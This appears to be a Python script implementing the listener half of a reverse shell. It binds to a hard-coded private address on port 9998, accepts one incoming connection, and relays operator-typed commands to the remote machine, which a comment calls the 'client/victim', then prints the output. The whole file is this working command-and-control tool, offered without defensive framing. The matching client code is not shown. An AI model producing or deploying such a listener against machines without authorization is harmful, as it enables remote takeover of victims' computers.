import socket
import sys
# to write terminal commands

# Create a socket (connect to computers)
def create_socket() :
    try:
        global host
        global port
        global s
        host = "10.196.2.98"
        port = 9998
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation error: "+ str(msg))

# binding the port and the host together and listening the connections
def bind_socket():
    try :
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: "+str(msg)+ "\n" + "Retrying...")
        bind_socket()   

#Establish connection with client (socket must be listening)
def socket_accept():
    conn,address = s.accept()
    print("connection has been established!"+"IP"+address[0]+"| Port"+str(address[1]))
    send_command(conn)
    conn.close()

#send the commands to client/victim or a friend
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end = "")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
